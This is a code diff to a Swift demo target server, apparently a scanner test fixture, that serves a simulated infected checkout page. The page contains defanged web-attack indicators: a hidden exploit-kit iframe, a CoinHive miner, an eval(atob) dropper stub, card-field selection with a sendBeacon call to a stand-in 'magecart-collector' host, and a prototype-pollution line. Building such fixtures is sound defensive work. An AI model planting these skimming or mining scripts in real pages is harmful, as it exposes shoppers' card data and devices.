@@ -236,20 +236,31 @@ public final class DemoTargetServer: @unchecked Sendable {
             let body = """
             <!DOCTYPE html>
             <html>
-            <head><title>Infected Page Simulation</title></head>
+            <head>
+                <title>Infected Page Simulation</title>
+                <link rel="stylesheet" href="/wp-content/plugins/vulnerable-slider/style.css?ver=1.2.0" />
+            </head>
             <body>
-                <h1>Checkout Page (Simulated Malware Infection)</h1>
+                <h1>Checkout Page (Simulated Malware & Advanced Threat Surface)</h1>
+                <a href="/vuln/malware.html?phpsessid=987654321&file=report.pdf">Download Invoice</a>
                 <iframe width="0" height="0" src="https://malicious-tds.invalid/exploit-kit"></iframe>
                 <script>
                     var miner = new CoinHive.Anonymous('site-key-simulation');
                     eval(atob("Y29uc29sZS5sb2coJ3NpbXVsYXRlZC1kcm9wcGVyJyk="));
                     var cards = document.querySelectorAll("input[name*=card_number]");
                     navigator.sendBeacon("https://magecart-collector.invalid/steal", "test");
+                    localStorage.setItem("jwt", "eyJhbGciOiJIUzI1NiJ9");
+                    var cfg = {}; cfg.__proto__.admin = true;
                 </script>
+                <!-- MongoError: bad query syntax -->
             </body>
             </html>
             """
             return httpResponse(status: "200 OK", headers: ["Content-Type": "text/html"], body: body)
+        }
+
+        if path == "/xmlrpc.php" {
+            return httpResponse(status: "405 Method Not Allowed", headers: ["Content-Type": "text/plain"], body: "XML-RPC server accepts POST requests only.")
         }
 
         if path == "/vuln/api/users" {
